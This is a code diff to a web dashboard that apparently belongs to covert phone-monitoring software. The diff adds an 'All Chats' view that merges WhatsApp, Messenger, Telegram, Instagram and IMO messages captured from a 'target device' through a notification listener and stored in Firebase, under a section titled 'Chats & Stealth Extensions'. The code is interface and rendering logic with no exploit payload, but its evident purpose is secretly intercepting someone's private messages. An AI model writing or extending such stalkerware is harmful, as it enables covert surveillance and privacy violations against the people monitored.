@@ -706,11 +706,12 @@
 
                     <!-- Chat App Tabs -->
                     <div style="display: flex; gap: 8px; margin-bottom: 16px; overflow-x: auto; padding-bottom: 4px;">
-                        <button class="btn-ghost" onclick="switchChatApp('whatsapp')" id="chat-tab-whatsapp" style="padding: 6px 14px; border-radius: var(--radius-pill); border-color: #25D366; color: #25D366;">WhatsApp</button>
-                        <button class="btn-ghost" onclick="switchChatApp('messenger')" id="chat-tab-messenger" style="padding: 6px 14px; border-radius: var(--radius-pill);">Messenger</button>
-                        <button class="btn-ghost" onclick="switchChatApp('telegram')" id="chat-tab-telegram" style="padding: 6px 14px; border-radius: var(--radius-pill);">Telegram</button>
-                        <button class="btn-ghost" onclick="switchChatApp('instagram')" id="chat-tab-instagram" style="padding: 6px 14px; border-radius: var(--radius-pill);">Instagram</button>
-                        <button class="btn-ghost" onclick="switchChatApp('imo')" id="chat-tab-imo" style="padding: 6px 14px; border-radius: var(--radius-pill);">IMO</button>
+                        <button class="btn-ghost" onclick="switchChatApp('all')" id="chat-tab-all" style="padding: 6px 14px; border-radius: var(--radius-pill); border-color: var(--primary); color: var(--primary); background: rgba(255,255,255,0.06);"><i class="fas fa-comments me-1"></i> All Chats</button>
+                        <button class="btn-ghost" onclick="switchChatApp('whatsapp')" id="chat-tab-whatsapp" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-whatsapp me-1"></i> WhatsApp</button>
+                        <button class="btn-ghost" onclick="switchChatApp('messenger')" id="chat-tab-messenger" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-facebook-messenger me-1"></i> Messenger</button>
+                        <button class="btn-ghost" onclick="switchChatApp('telegram')" id="chat-tab-telegram" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-telegram me-1"></i> Telegram</button>
+                        <button class="btn-ghost" onclick="switchChatApp('instagram')" id="chat-tab-instagram" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fab fa-instagram me-1"></i> Instagram</button>
+                        <button class="btn-ghost" onclick="switchChatApp('imo')" id="chat-tab-imo" style="padding: 6px 14px; border-radius: var(--radius-pill);"><i class="fas fa-comment-dots me-1"></i> IMO</button>
                     </div>
 
                     <!-- Chat Messages List -->
@@ -2028,18 +2029,28 @@
     // ==========================================
     // 7. Chats & Stealth Extensions
     // ==========================================
-    let activeChatApp = 'whatsapp';
+    // 7. Chats & Stealth Extensions
+    // ==========================================
+    let activeChatApp = 'all';
+    const allChatStore = {
+        whatsapp: {},
+        messenger: {},
+        telegram: {},
+        instagram: {},
+        imo: {}
+    };
     
     function switchChatApp(appKey) {
         activeChatApp = appKey;
         
         // Reset styles for all tabs
-        const apps = ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo'];
+        const apps = ['all', 'whatsapp', 'messenger', 'telegram', 'instagram', 'imo'];
         apps.forEach(a => {
             const el = document.getElementById('chat-tab-' + a);
             if (el) {
                 el.style.borderColor = 'var(--border)';
                 el.style.color = 'var(--text-muted)';
+                el.style.background = 'transparent';
             }
         });
         
@@ -2052,52 +2063,77 @@
             else if (appKey === 'telegram') color = '#0088cc';
             else if (appKey === 'instagram') color = '#E1306C';
             else if (appKey === 'imo') color = '#FFC107';
+            else if (appKey === 'all') color = 'var(--primary)';
             
             activeEl.style.borderColor = color;
             activeEl.style.color = color;
+            activeEl.style.background = 'rgba(255,255,255,0.06)';
         }
         
-        // Render messages for this app
-        devRef.child('chats/' + appKey + '/messages').once('value', snap => {
-            renderChatMessages(appKey, snap.val());
-        });
+        renderCurrentChatView();
     }
     
-    function renderChatMessages(appKey, data) {
+    function renderCurrentChatView() {
         const container = document.getElementById('chatMessagesContainer');
         if (!container) return;
         
-        if (!data) {
+        let msgs = [];
+        if (activeChatApp === 'all') {
+            ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo'].forEach(app => {
+                const appData = allChatStore[app] || {};
+                for (const k in appData) {
+                    msgs.push(appData[k]);
+                }
+            });
+        } else {
+            const appData = allChatStore[activeChatApp] || {};
+            for (const k in appData) {
+                msgs.push(appData[k]);
+            }
+        }
+        
+        if (msgs.length === 0) {
             container.innerHTML = `
                 <div class="empty-state">
                     <i class="fas fa-comment-slash"></i>
-                    <p>No chat messages captured yet. Ensure Notification Listener is enabled on the target device.</p>
+                    <p>No chat messages captured yet for ${activeChatApp.toUpperCase()}. Incoming messages from WhatsApp, Messenger, Telegram, Instagram, and IMO will appear here automatically.</p>
                 </div>`;
             return;
         }
         
-        const msgs = [];
-        for (const key in data) {
-            msgs.push(data[key]);
-        }
         msgs.sort((a, b) => (b.time || 0) - (a.time || 0)); // Newest first
         
         let html = '';
         msgs.forEach(msg => {
             const sender = msg.sender || 'Unknown';
             const body = msg.body || '';
+            const app = (msg.app || 'chat').toLowerCase();
             const time = msg.time ? new Date(msg.time).toLocaleString() : '';
             const initial = sender.charAt(0).toUpperCase();
             
+            let appColor = '#25D366';
+            let appLabel = 'WhatsApp';
+            let appIcon = 'fab fa-whatsapp';
+            
+            if (app === 'messenger') { appColor = '#00B2FF'; appLabel = 'Messenger'; appIcon = 'fab fa-facebook-messenger'; }
+            else if (app === 'telegram') { appColor = '#0088cc'; appLabel = 'Telegram'; appIcon = 'fab fa-telegram'; }
+            else if (app === 'instagram') { appColor = '#E1306C'; appLabel = 'Instagram'; appIcon = 'fab fa-instagram'; }
+            else if (app === 'imo') { appColor = '#FFC107'; appLabel = 'IMO'; appIcon = 'fas fa-comment-dots'; }
+            
             html += `
-            <div style="display: flex; gap: 10px; align-items: flex-start; margin-bottom: 12px; width: 100%;">
-                <div style="width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; font-weight: 700; color: #fff; flex-shrink: 0;">
+            <div style="display: flex; gap: 12px; align-items: flex-start; margin-bottom: 12px; width: 100%;">
+                <div style="width: 38px; height: 38px; border-radius: 50%; background: ${appColor}22; border: 1px solid ${appColor}55; display: flex; align-items: center; justify-content: center; font-weight: 700; color: ${appColor}; flex-shrink: 0; font-size: 0.9rem;">
                     ${initial}
                 </div>
-                <div style="background: rgba(255,255,255,0.05); padding: 12px 16px; border-radius: 18px 18px 18px 4px; max-width: 85%;">
-                    <div style="font-size: 0.75rem; font-weight: 700; color: var(--text-muted); margin-bottom: 4px;">${escapeHtml(sender)}</div>
-                    <div style="font-size: 0.85rem; color: #fff; word-break: break-word;">${escapeHtml(body)}</div>
-                    <div style="font-size: 0.65rem; color: var(--text-muted); text-align: right; margin-top: 6px;">${time}</div>
+                <div style="background: rgba(255,255,255,0.04); border: 1px solid var(--border); border-left: 3px solid ${appColor}; padding: 12px 16px; border-radius: 14px; max-width: 85%; flex: 1;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 6px;">
+                        <span style="font-size: 0.82rem; font-weight: 700; color: #fff;">${escapeHtml(sender)}</span>
+                        <span class="live-badge" style="font-size: 0.65rem; background: ${appColor}18; color: ${appColor}; border: 1px solid ${appColor}40;">
+                            <i class="${appIcon}" style="margin-right: 3px;"></i> ${appLabel}
+                        </span>
+                    </div>
+                    <div style="font-size: 0.88rem; color: #ddd; word-break: break-word; line-height: 1.45; white-space: pre-wrap;">${escapeHtml(body)}</div>
+                    <div style="font-size: 0.68rem; color: var(--text-muted); text-align: right; margin-top: 6px;">${time}</div>
                 </div>
             </div>`;
         });
@@ -2109,9 +2145,8 @@
         const apps = ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo'];
         apps.forEach(app => {
             devRef.child('chats/' + app + '/messages').on('value', snap => {
-                if (activeChatApp === app) {
-                    renderChatMessages(app, snap.val());
-                }
+                allChatStore[app] = snap.val() || {};
+                renderCurrentChatView();
             });
         });
     }
